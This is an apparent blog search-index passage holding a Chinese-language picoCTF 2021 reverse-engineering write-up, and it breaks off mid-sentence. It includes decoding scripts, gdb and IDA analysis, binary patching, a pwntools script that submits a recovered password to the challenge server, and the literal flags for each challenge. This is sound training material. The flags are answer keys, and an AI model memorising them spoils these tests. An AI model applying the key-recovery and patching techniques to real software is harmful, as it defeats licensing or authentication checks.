<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>picoCTF 2021 reverse write-up</title>
      <link href="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/"/>
      <url>/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Transformation-20-points"><a href="#Transformation-20-points" class="headerlink" title="Transformation [20 points]"></a>Transformation [20 points]</h1><p>題目給了加密的方法為：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>((<span class="built_in">ord</span>(flag[i]) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>(flag[i + <span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)])</span><br></pre></td></tr></table></figure><p>寫一個程式把它解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encode_flag = <span class="built_in">open</span>(<span class="string">&quot;enc&quot;</span>).read()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encode_flag)):</span><br><span class="line">    character1 = <span class="built_in">chr</span>((<span class="built_in">ord</span>(encode_flag[i]) &gt;&gt; <span class="number">8</span>))</span><br><span class="line">    character2 = <span class="built_in">chr</span>(encode_flag[i].encode(<span class="string">&#x27;utf-16be&#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line">    flag += character1</span><br><span class="line">    flag += character2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{16_bits_inst34d_of_8_26684c20}</p></blockquote><h1 id="keygenme-py-30-points"><a href="#keygenme-py-30-points" class="headerlink" title="keygenme-py [30 points]"></a>keygenme-py [30 points]</h1><p>從source code中看到已經有一部分flag，看起來是要找出 key_part_dynamic1_trial</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key_part_static1_trial = <span class="string">&quot;picoCTF&#123;1n_7h3_|&lt;3y_of_&quot;</span></span><br><span class="line">key_part_dynamic1_trial = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">key_part_static2_trial = <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial</span><br></pre></td></tr></table></figure><p>把username拿去sha256後取4,5,3,6,2,7,1,8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag_part1 = <span class="string">&quot;picoCTF&#123;1n_7h3_|&lt;3y_of_&quot;</span></span><br><span class="line">flag_part2 = <span class="string">&quot;&quot;</span>.join([hashlib.sha256(<span class="string">b&quot;GOUGH&quot;</span>).hexdigest()[x] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">8</span>]])</span><br><span class="line">flag_part3 = <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag = flag_part1 + flag_part2 + flag_part3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{1n_7h3_|&lt;3y_of_f911a486}</p></blockquote><h1 id="crackme-py-30-points"><a href="#crackme-py-30-points" class="headerlink" title="crackme-py [30 points]"></a>crackme-py [30 points]</h1><p>這題看完source code後發現他已經有寫好的function只是沒有使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_secret</span>(<span class="params">secret</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ROT47 decode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: encode and decode are the same operation in the ROT cipher family.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Encryption key</span></span><br><span class="line">    rotate_const = <span class="number">47</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Storage for decoded secret</span></span><br><span class="line">    decoded = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decode loop</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> secret:</span><br><span class="line">        index = alphabet.find(c)</span><br><span class="line">        original_index = (index + rotate_const) % <span class="built_in">len</span>(alphabet)</span><br><span class="line">        decoded = decoded + alphabet[original_index]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(luyee㉿DESKTOP-KADOGNG)-[~/picoCTF]</span><br><span class="line">└─$ /bin/python3 /home/luyee/picoCTF/2021/reverse/crackme-py/crackme.py</span><br><span class="line">What&#x27;s your first number? 123</span><br><span class="line">What&#x27;s your second number? 123</span><br><span class="line">The number with largest positive magnitude is 123</span><br><span class="line">picoCTF&#123;1|\/|_4_p34|\|ut_4593da8a&#125;</span><br></pre></td></tr></table></figure><p>所以直接拿來用，Flag就出來了＠＠</p><blockquote><p>flag: picoCTF{1|/|_4_p34||ut_4593da8a}</p></blockquote><h1 id="ARMssembly-0-40-points"><a href="#ARMssembly-0-40-points" class="headerlink" title="ARMssembly 0 [40 points]"></a>ARMssembly 0 [40 points]</h1><p>這題就是看ASM發現在比大小，傳入兩個參數後，回傳最大者，故如果<code>182476535</code>和<code>3742084308</code>，會回傳<code>3742084308</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func1:</span><br><span class="line">subsp, sp, #16</span><br><span class="line">strw0, [sp, 12]</span><br><span class="line">strw1, [sp, 8]</span><br><span class="line">ldrw1, [sp, 12]</span><br><span class="line">ldrw0, [sp, 8]</span><br><span class="line">cmpw1, w0</span><br><span class="line">bls.L2</span><br><span class="line">ldrw0, [sp, 12]</span><br><span class="line">b.L3</span><br></pre></td></tr></table></figure><p>把<code>3742084308</code>轉成hex去除0x就得到flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">hex</span>(<span class="number">3742084308</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;picoCTF&#123;&#x27;</span>+flag[<span class="number">2</span>::]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{df0bacd4}</p></blockquote><h1 id="speeds-and-feeds-50-points"><a href="#speeds-and-feeds-50-points" class="headerlink" title="speeds and feeds [50 points]"></a>speeds and feeds [50 points]</h1><p>nc過去後發現印出類似座標的東西，先把他存起來</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc mercury.picoctf.net 59953 &gt; flag.txt</span><br></pre></td></tr></table></figure><p>google了一下發現這東西是Gcode -&gt; CNC在使用的</p><p>把他丟到這<a href="https://ncviewer.com/">網站</a>就跑出flag了<br><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image.png"></p><blockquote><p>flag: picoCTF{num3r1ca1_cOntrO1_f3fea95b}</p></blockquote><h1 id="Shop-50-points"><a href="#Shop-50-points" class="headerlink" title="Shop [50 points]"></a>Shop [50 points]</h1><p>丟到IDA分析，從main開始追<br><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image-3.png"></p><p>接著看到main_openShop，可以看到monery &#x3D; main_menu的返回值，所以繼續追到main_menu<br><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image-1.png"></p><p>到main_menu看到v15 &#x3D; wallet - *num * 選擇價格，是值運算，代表可以輸入負數讓錢越來越多<br><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image-2.png"></p><p>直接nc過去實作<br><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image-4.png"><br>得到加密的flag，看起來是ASCII碼，使用python轉碼，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">112</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">123</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用列表生成式將ASCII碼轉換為對應的字母</span></span><br><span class="line">result = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> arr]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將結果串聯成字串</span></span><br><span class="line">result_string = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 印出轉換後字的</span></span><br><span class="line"><span class="built_in">print</span>(result_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{b4d_brogrammer_797b292c}</p></blockquote><h1 id="ARMssembly-1-70-points"><a href="#ARMssembly-1-70-points" class="headerlink" title="ARMssembly 1 [70 points]"></a>ARMssembly 1 [70 points]</h1><p>先把檔案載下來，發現是armv8-a架構，屬於AArch64，因為自己的系統是x86_64所以嘗試Cross-Compile and Link，跑起來時發現要輸入正確的數字才會對，所以使用shell script去暴力解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cross-Compile and Link</span></span><br><span class="line">$(aarch64-linux-gnu-as -o chall_1.o chall_1.S)</span><br><span class="line">$(aarch64-linux-gnu-gcc -o chall_1.elf chall_1.o)</span><br><span class="line">$(<span class="built_in">chmod</span> +x chall_1.elf)</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Running with input: <span class="variable">$counter</span>&quot;</span></span><br><span class="line">    <span class="comment"># 透過 $() 捕捉執行後的輸出</span></span><br><span class="line">    output=$(qemu-aarch64 ./chall_1.elf <span class="variable">$counter</span>)</span><br><span class="line">    <span class="comment"># 檢查輸出是否不等於 &quot;You Lose :(&quot; 字串</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$output</span> != *<span class="string">&quot;You Lose :(&quot;</span>* ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Found the correct input: <span class="variable">$counter</span>&quot;</span></span><br><span class="line">        <span class="comment"># 格式要為picoCTF&#123;XXXXXXXX&#125; -&gt; (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF&#123;0055aabb&#125;)</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Flag: picoCTF&#123;<span class="subst">$(printf <span class="string">&quot;%08x&quot;</span> $counter)</span>&#125;&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    counter=$((counter + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h1 id="ARMssembly-2-90-points"><a href="#ARMssembly-2-90-points" class="headerlink" title="ARMssembly 2 [90 points]"></a>ARMssembly 2 [90 points]</h1><p>把題目給的數字丟進去，轉進制就出來了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cross-Compile and Link</span></span><br><span class="line">$(aarch64-linux-gnu-as -o chall_2.o chall_2.S)</span><br><span class="line">$(aarch64-linux-gnu-gcc -o chall_2.elf chall_2.o)</span><br><span class="line">$(<span class="built_in">chmod</span> +x chall_2.elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行結果: Result: 3979085410</span></span><br><span class="line"><span class="comment"># 只取數值部分</span></span><br><span class="line">output=$(qemu-aarch64 ./chall_2.elf 4189673334 | grep -o <span class="string">&#x27;[0-9]*&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag: picoCTF&#123;<span class="subst">$(printf <span class="string">&quot;%08x&quot;</span> $output)</span>&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Hurry-up-Wait-100-points"><a href="#Hurry-up-Wait-100-points" class="headerlink" title="Hurry up! Wait! [100 points]"></a>Hurry up! Wait! [100 points]</h1><p>載下來後先file發現這檔案其實是elf，雖然檔名是exe</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(luyee㉿DESKTOP-KADOGNG)-[~/picoCTF/2021/reverse/Hurry up! Wait!]</span><br><span class="line">└─$ file svchost.exe</span><br><span class="line">svchost.exe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c083b0f6ecaeb1517082fb6ed0cd9e3f295ec2cc, stripped</span><br></pre></td></tr></table></figure><p>gdb執行的時候噴錯：<code>error while loading shared libraries: libgnat-7.so.1</code><br>所以去載一下需要的libraries，用gdb跑起來發現會卡住，感覺就有貓膩，丟到IDA去分析<br>從main開始分析，看到會call <code>sub_1D7C</code> <code>sub_298A</code> <code>sub_1D52</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main proc near</span><br><span class="line">...忽略</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    ___gnat_initialize</span><br><span class="line">call    sub_1D7C</span><br><span class="line">call    sub_298A</span><br><span class="line">call    sub_1D52</span><br><span class="line">call    ___gnat_finalize</span><br><span class="line">...忽略</span><br></pre></td></tr></table></figure><p>每個functio都點進去看一下後發現 <code>sub_298A</code>裡面有一個delay function，delay 1000000000000000 秒難怪執行後會卡住，所以推測底下就是print flag的function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_298A proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     rdi, 1000000000000000</span><br><span class="line">call    _ada__calendar__delays__delay_for</span><br><span class="line">...忽略</span><br></pre></td></tr></table></figure><blockquote><p>思路：在rdi賦值後把數值改成0</p></blockquote><p><img src="/2024/01/30/CTF/picoCTF/All-Write-Up/picoCTF2021-Write-up/image-6.png" alt="Alt text"></p><blockquote><p>flag: picoCTF{d15a5m_ftw_eab78e4}</p></blockquote><h1 id="gogo-110-points"><a href="#gogo-110-points" class="headerlink" title="gogo [110 points]"></a>gogo [110 points]</h1><p>先丟到IDA反編譯，從<code>main_main</code>中可看出使用<em>scanf</em>去讀密碼<code>_currPasswd</code>然後傳入<code>checkPasswd</code>，所以接著去看<code>checkPasswd</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_currPasswd = (<span class="built_in">string</span> *)runtime_newobject((runtime__type *)&amp;RTYPE_string_0);</span><br><span class="line">typ[<span class="number">0</span>].<span class="built_in">array</span> = (interface_ *)<span class="string">&quot;Enter Password: &quot;</span>;</span><br><span class="line">typ[<span class="number">0</span>].len = <span class="number">16</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;typ[<span class="number">0</span>].cap, <span class="number">0</span>, <span class="keyword">sizeof</span>(_slice_interface_));</span><br><span class="line">fmt_Printf(*(<span class="built_in">string</span> *)&amp;typ[<span class="number">0</span>].<span class="built_in">array</span>, *(_slice_interface_ *)&amp;typ[<span class="number">0</span>].cap);</span><br><span class="line">v6[<span class="number">0</span>] = &amp;RTYPE__ptr_string;</span><br><span class="line">v6[<span class="number">1</span>] = _currPasswd;</span><br><span class="line">typ[<span class="number">0</span>].<span class="built_in">array</span> = (interface_ *)<span class="string">&quot;%s\n&quot;</span>;</span><br><span class="line">typ[<span class="number">0</span>].len = <span class="number">3</span>;</span><br><span class="line">typ[<span class="number">0</span>].cap = (<span class="type">int</span>)v6;</span><br><span class="line">*(_QWORD *)&amp;typ[<span class="number">1</span>].<span class="built_in">array</span> = <span class="number">0x100000001</span>LL;</span><br><span class="line">fmt_Scanf(*(<span class="built_in">string</span> *)&amp;typ[<span class="number">0</span>].<span class="built_in">array</span>, *(_slice_interface_ *)&amp;typ[<span class="number">0</span>].cap);</span><br><span class="line">main_checkPassword(*_currPasswd);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.checkPassword</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __usercall main_checkPassword@&lt;eax&gt;(<span class="built_in">string</span> input)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  uint8 key[<span class="number">32</span>]; <span class="comment">// [esp+4h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [esp+24h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( input.len &lt; <span class="number">32</span> )</span><br><span class="line">    os_Exit(<span class="number">0</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))loc_8090B18)();</span><br><span class="line">  qmemcpy(key, <span class="string">&quot;861836f13e3d627dfa375bdb8389214e&quot;</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))loc_8090FE0)();</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">int</span>)result &lt; <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= input.len || result &gt;= <span class="number">0x20</span> )</span><br><span class="line">      runtime_panicindex();</span><br><span class="line">    <span class="keyword">if</span> ( (key[result] ^ input.str[result]) == v4[result] )</span><br><span class="line">      ++v2;</span><br><span class="line">    ++result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>條件:<code>input.len</code>要大於32 且 <code>key[result]</code>^<code>input.str[result]</code>要等於<code>v4[result]</code></p><p>思路: 把<code>key[result]</code>和<code>input.str[result]</code>找出來後xor就拿到密碼了</p><p><code>key[result]</code> 記憶體位址：<code>$esp+$eax*1+0x4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤ hexdump byte <span class="variable">$esp</span>+<span class="variable">$eax</span>*1+0x4 -s 32</span><br><span class="line">0x1844ff28     38 36 31 38 33 36 66 31 33 65 33 64 36 32 37 64    861836f13e3d627d</span><br><span class="line">0x1844ff38     66 61 33 37 35 62 64 62 38 33 38 39 32 31 34 65    fa375bdb8389214e</span><br></pre></td></tr></table></figure><p><code>input.str[result]</code> 記憶體位址：$esp+$eax*1+0x24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump byte <span class="variable">$esp</span>+<span class="variable">$eax</span>*1+0x24 -s 32</span><br><span class="line">0x1844ff48     4a 53 47 5d 41 45 03 54 5d 02 5a 0a 53 57 45 0d    JSG]AE.T].Z.SWE.</span><br><span class="line">0x1844ff58     05 00 5d 55 54 10 01 0e 41 55 57 4b 45 50 46 01    ..]UT...AUWKEPF.</span><br></pre></td></tr></table></figure><p>寫成pwn script如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># password = key[result] ^ input.str[result]</span></span><br><span class="line">key = unhex(<span class="string">&quot;3836313833366631336533643632376466613337356264623833383932313465&quot;</span>)</span><br><span class="line"><span class="built_in">input</span> = unhex(<span class="string">&quot;4a53475d414503545d025a0a5357450d05005d555410010e4155574b45504601&quot;</span>)</span><br><span class="line">password = xor(key, <span class="built_in">input</span>)</span><br><span class="line"><span class="comment"># 印出 password 但不要有 b&#x27;</span></span><br><span class="line"><span class="comment"># print(f&#x27;password:&#123;password.decode()&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令 nc 過去輸入 password 和 goldfish</span></span><br><span class="line">r = remote(<span class="string">&#x27;mercury.picoctf.net&#x27;</span>, <span class="number">48728</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Enter Password:&#x27;</span>)</span><br><span class="line">r.sendline(password)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;What is the unhashed key?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;goldfish&#x27;</span>)</span><br><span class="line"><span class="comment">#接收輸出</span></span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{p1kap1ka_p1c0b187f1db}</p></blockquote><h1 id="ARMssembly-3-130-points"><a href="#ARMssembly-3-130-points" class="headerlink" title="ARMssembly 3 [130 points]"></a>ARMssembly 3 [130 points]</h1><p>和ARMssembly 2一樣，編譯起來把數字帶入Flag就出來了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cross-Compile and Link</span></span><br><span class="line">$(aarch64-linux-gnu-as -o chall_3.o chall_3.S)</span><br><span class="line">$(aarch64-linux-gnu-gcc -o chall_3.elf chall_3.o)</span><br><span class="line">$(<span class="built_in">chmod</span> +x chall_3.elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run</span></span><br><span class="line">output=$(qemu-aarch64 ./chall_3.elf 2541039191 | grep -o <span class="string">&#x27;[0-9]*&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag: picoCTF&#123;<span class="subst">$(printf <span class="string">&quot;%08x&quot;</span> $output)</span>&#125;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{00000039}</p></blockquote><h1 id="Let’s-get-dynamic-150-points"><a href="#Let’s-get-dynamic-150-points" class="headerlink" title="Let’s get dynamic [150 points]"></a>Let’s get dynamic [150 points]</h1><p>先編譯並跑起來隨邊塞值測試</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(luyee㉿DESKTOP-KADOGNG)-[~/picoCTF/2021/reverse/Let&#x27;s get dynamic]</span><br><span class="line">└─$ gcc chall.S -o chall.o</span><br><span class="line"></span><br><span class="line">┌──(luyee㉿DESKTOP-KADOGNG)-[~/picoCTF/2021/reverse/Let&#x27;s get dynamic]</span><br><span class="line">└─$ ./chall.o </span><br><span class="line">123</span><br><span class="line">Correct! You entered the flag.</span><br></pre></td></tr></table></figure><p>看到題目說Let’s get dynamic，可以想到應該是要動態偵錯</p><p><code>x/96i main</code> -&gt; 看一下main在幹嘛</p><p>看到&lt;main+385&gt;時呼叫memcmp，所以下斷點在&lt;main+385&gt; -&gt; <code>b *(main+385)</code> -&gt; <code>run</code></p><p>之後可以看到flag已經傳到 <code>$rsi</code>  ，而剛剛輸入隨便輸入的測值放在<code>$rdi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">memcmp@plt (</span><br><span class="line">   <span class="variable">$rdi</span> = 0x00007fffffffe080 → 0x0000000a66647361 (<span class="string">&quot;asdf\n&quot;</span>?),</span><br><span class="line">   <span class="variable">$rsi</span> = 0x00007fffffffe040 → <span class="string">&quot;picoCTF&#123;dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700&#125;&quot;</span>,</span><br><span class="line">   <span class="variable">$rdx</span> = 0x0000000000000031,</span><br><span class="line">   <span class="variable">$rcx</span> = 0x00007fffffffe040 → <span class="string">&quot;picoCTF&#123;dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700&#125;&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>使用 <code>x/s 